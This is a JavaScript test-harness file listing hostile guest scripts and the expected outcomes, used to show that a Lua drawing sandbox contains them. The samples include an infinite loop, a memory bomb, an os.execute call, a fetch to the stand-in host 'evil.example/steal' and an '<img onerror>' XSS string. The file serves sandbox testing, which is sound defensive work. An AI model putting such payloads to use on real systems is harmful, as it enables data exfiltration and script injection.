// src/utils/semagram/presets/adversarial.js
//
// The Phase 0 acceptance harness (SEMAGRAM.md §8). Each entry is a hostile or
// pathological guest script plus what SHOULD happen. The dev page runs these and
// shows the outcome, so the sandbox guarantees are demonstrable, not just claimed.

export const ADVERSARIAL = [
    {
        label: 'Infinite loop',
        expect: 'Killed by host wall-clock timeout',
        code: 'while true do end',
    },
    {
        label: 'Memory bomb',
        expect: 'Bounded — errors or is terminated',
        code: 'local t = {}\nlocal i = 1\nwhile true do t[i] = string.rep("x", 100000); i = i + 1 end',
    },
    {
        label: 'os.execute',
        expect: 'Error: attempt to index a nil value (os)',
        code: 'os.execute("echo pwned")',
    },
    {
        label: 'io access',
        expect: 'Error: attempt to index a nil value (io)',
        code: 'io.write("nope")',
    },
    {
        label: 'require a module',
        expect: 'Error: attempt to call a nil value (require)',
        code: 'require("socket")',
    },
    {
        label: 'Reach JS via js bridge',
        expect: 'Error: js is nil (bridge disabled)',
        code: 'js.global.fetch("https://evil.example/steal")',
    },
    {
        label: 'load() codegen',
        expect: 'Error: attempt to call a nil value (load)',
        code: 'local f = load("return 1"); f()',
    },
    {
        label: 'emit flood (100k)',
        expect: 'Capped at MAX_OPS (5000)',
        code: "for i = 1, 100000 do emit({ type = 'dot', cx = i % 400, cy = 100 }) end",
    },
    {
        label: 'Garbage / injection ops',
        expect: 'Dropped by validateOps; only the valid arc survives',
        code: "emit({ type = 'script', evil = '<img src=x onerror=alert(1)>' })\n" +
              "emit({ type = 'arc', cx = 200, cy = 100, r = 40, start = 0, stop = 180, sweep = 1 })",
    },
];
